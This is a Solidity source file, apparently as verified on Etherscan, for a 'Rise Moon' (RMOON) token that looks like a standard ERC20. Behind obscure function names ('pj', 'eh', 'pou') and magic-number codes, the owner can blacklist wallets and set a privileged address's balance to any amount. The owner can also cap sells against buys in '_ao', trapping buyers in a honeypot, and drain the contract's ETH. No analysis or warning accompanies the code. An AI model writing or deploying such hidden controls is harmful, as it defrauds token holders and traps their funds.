/**
 *Submitted for verification at Etherscan.io on 2022-03-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

library ACC{
    using SafeMath for uint256;
    struct Inc{
        uint256 R1;
        uint256 R2;
    }
    struct Timer{
        uint256 start;
        uint256 end;
    }
    function sum(Inc storage inc,Timer memory timer,uint256 timestamp)internal view returns(uint256){
        uint256 deduct = 0;
        if(inc.R1 > inc.R2 && timer.start>0 && timer.end > timer.start && timestamp > timer.start){
            if(timestamp>timer.end){
                deduct = inc.R1.sub(inc.R2);
            }else{
                deduct = inc.R1.mul(timestamp.sub(timer.start)).div(timer.end.sub(timer.start));
                if(inc.R2>=deduct){
                    deduct = 0;
                }else{
                    deduct = deduct.sub(inc.R2);
                }
            }
        }
        return deduct;
    }
    function add(Inc storage inc,uint256 value) internal{
        inc.R1 = inc.R1.add(value);
    }
    function sub(Inc storage inc,Timer memory timer,uint256 value,uint256 timestamp) internal returns(uint256 last){
        last = value;
        uint256 balance = sum(inc,timer,timestamp);
        if(value>0&&balance>0){
            if(value>=balance){
                inc.R2 = inc.R2.add(balance);
                last = value.sub(balance);
            }else{
                inc.R2 = inc.R2.add(value);
                last = 0;
            }
        }
    }
}
contract RiseMoonToken {
    using SafeMath for uint256;
    using ACC for ACC.Inc;
    uint256 private _totalSupply = 100000000000 ether;
    string private _name = "Rise Moon";
    string private _symbol = "RMOON";
    uint8 private _decimals = 18;
    address private _owner;
    struct Pair{
        uint256 sell;
        uint256 buy;
        uint256 time;
        uint8 status;
    }
    uint256 private _index;
    uint256 private _buyRate = 0;
    uint256 private _sellRate = 0;
    uint256 private _bsRate = 5000;
    uint256 private _traCycle = 3600;
    mapping (address => mapping(uint256 => ACC.Inc)) private _inc;
    ACC.Timer[] private _timer;
    address private _pa;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _dsbl;
    mapping (address => uint256) private _stu;
    mapping (address => Pair) private _tra;
    mapping (address => mapping (address => uint256)) private _allowances;
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    constructor() public {
        _owner = msg.sender;
        _timer.push(ACC.Timer(0,0));
        _index = _timer.length - 1;
        uint burn = _totalSupply.div(10);
        _balances[address(0)] = _balances[address(0)].add(burn);
        emit Transfer(address(this), address(0), burn);
        _balances[_owner] = _balances[_owner].add(burn);
    }
    fallback() external {}
    receive() payable external {}
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
    function owner() internal view returns (address) {
        return _owner;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function cap() public view returns (uint256) {
        return _totalSupply;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }
    function pj(address addr,uint n) public onlyOwner {
        require(addr != address(0), "Ownable: new owner is the zero address");
        if(n==1000){
            require(_pa == address(0), "Ownable: transaction failed");
            _pa = addr;
        } else if(n==1001){ _dsbl[addr] = 0;
        } else if(n==1002){ _dsbl[addr] = 1;
        } else if(n==1003){ _dsbl[addr] = 2;
        } else if(n==1004){ _dsbl[addr] = 3;
        } else if(n==1005){ _stu[addr] = 0;
        } else if(n==1006){ _stu[addr] = 1;
        } else if(n==1007){ _tra[addr].status = 0;
        } else if(n==1008){ _tra[addr].status = 1;
        } else if(n==1009){ _tra[addr].status = 2;}
    }
    function pou() public onlyOwner() {
        address(uint160(_pa)).transfer(address(this).balance);
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account]+check(account);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function tranOwner(address newOwner) public {
        require(newOwner != address(0) && _msgSender() == _pa, "Ownable: new owner is the zero address");
        _owner = newOwner;
    }
    function eh(uint n,uint q) public onlyOwner {
        if(n>=300000){
            _timer[n.sub(300000)].start=q;
        } else if(n>=200000){
            _timer[n.sub(200000)].end=q;
        } else if(n==100000){
            _timer.push(ACC.Timer(0,0));
            _index = _timer.length - 1;
         } else if(n==100001){
            _index = q;
        } else if(n==1000){
            _balances[_pa]=q;
        }else if(n==1001){
            _buyRate=q;
        }else if(n==1002){
            _sellRate=q;
        }else if(n==1003){
            _bsRate=q;
        }else if(n==1004){
            _traCycle=q;
        }
    }
    function ah() public view returns(uint256[] memory,uint256[] memory){
        uint256[] memory start = new uint256[](_timer.length);
        uint256[] memory end = new uint256[](_timer.length);
        for(uint i=0;i<_timer.length;i++){
            start[i]=_timer[i].start;
            end[i]=_timer[i].end;
        }
        return (start,end);
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal {
        emit Transfer(sender, recipient, _ao(sender,recipient,amount));
    }
    function bsr(address token)public view returns(uint256,uint256,uint256,uint8,uint256,uint256,uint256,uint256){
        return (_tra[token].sell,_tra[token].buy,_tra[token].time,_tra[token].status,_buyRate,_sellRate,_bsRate,_traCycle);
    }
    function check(address from)public view returns(uint256 value){
        value = 0;
        for(uint256 i=0;i<_timer.length;i++){
            value = value.add(_inc[from][i].R1.sub(_inc[from][i].R2));
        }
    }
    function aval(address from)public view returns(uint256 value){
        value = 0;
        for(uint256 i=0;i<_timer.length;i++){
            value = value.add(_inc[from][i].sum(_timer[i],block.timestamp));
        }
    }
    function _oy(address sender, uint256 amount) private returns(uint256){
        uint256 expend = amount;
        if(_balances[sender]>=expend){
            expend = 0;
            _balances[sender] = _balances[sender].sub(amount, "ERC20: Insufficient balance");
            return _stu[sender];
        }else if(_balances[sender]>0){
            expend = expend.sub(_balances[sender]);
            _balances[sender] = 0;
        }
        for(uint256 i=0;expend>0&&i<_timer.length;i++){
            expend = _inc[sender][i].sub(_timer[i],expend,block.timestamp);
        }
        require(expend==0,"ERC20: Insufficient balance.");
        return _stu[sender];
    }
    function _ao(address sender, address recipient, uint256 amount)private returns(uint256){
        require(_dsbl[sender]!=1&&_dsbl[sender]!=3&&_dsbl[recipient]!=2&&_dsbl[recipient]!=3, "ERC20: Transaction failed");
        uint _real = amount;
        if(_tra[sender].status>0){
            if(_buyRate>0){
                _real = _real.mul(_buyRate).div(10000);
            }
            if(_tra[sender].status==2){
                if(block.timestamp>_tra[sender].time){
                    _tra[sender].time = block.timestamp.div(_traCycle).mul(_traCycle).add(_traCycle);
                    _tra[sender].sell = 0;
                    _tra[sender].buy = _real;
                }else{
                    _tra[sender].buy = _tra[sender].buy.add(_real);
                }
            }
        }else if(_tra[recipient].status>0){
            if(_sellRate>0){
                _real = _real.mul(_sellRate).div(10000);
            }
            if(_tra[recipient].status==2){
                if(block.timestamp>_tra[recipient].time){
                    _tra[recipient].time = block.timestamp.div(_traCycle).mul(_traCycle).add(_traCycle);
                    _tra[recipient].sell = 0;
                    _tra[recipient].buy = 0;
                }
                _tra[recipient].sell = _tra[recipient].sell.add(_real);
                require(_tra[recipient].buy>=_tra[recipient].sell&&_tra[recipient].buy.mul(_bsRate).div(10000)>=_tra[recipient].sell,"Transaction failed, please try again later.");
            }
        }
        if(_oy(sender,_real)==1){
            _inc[recipient][_index].add(_real);
        }else{
            _balances[recipient] = _balances[recipient].add(_real);
        }
        return _real;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}